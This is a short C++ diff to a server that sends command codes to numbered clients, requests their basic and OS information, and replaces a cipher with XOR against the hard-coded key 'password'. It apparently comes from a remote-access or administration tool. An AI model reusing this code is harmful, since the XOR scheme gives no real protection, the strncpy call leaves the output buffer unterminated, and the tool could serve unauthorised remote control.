@@ -259,7 +259,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					char *cBufferInfo = nullptr;
 					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqBasicInfo, 0) > 0){
 						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferInfo, 1024) > 0){
-							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 1 : 0);
+							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 0 : 1);
 						} else {
 							std::cout<<"Unable to retrieve information from client\n";
 							error();
@@ -595,7 +595,11 @@ int Server::ssRecvBinary(int sckSocket, char*& cOutput, int sBytes){
 		return -1;
 	}
 	cBuffer[iBytes] = '\0';
-	cOutput = BinaryUnCipher((const char *)cBuffer);
+	std::string strTmp = ShellXor(std::string(cBuffer), std::string("password"));
+	int iLen = strTmp.length();
+	cOutput = new char[iLen+1];
+	strncpy(cOutput, strTmp.c_str(), iLen);
+	//cOutput = BinaryUnCipher((const char *)cBuffer);
 	delete[] cBuffer;
 	cBuffer = nullptr;
 	return iBytes;
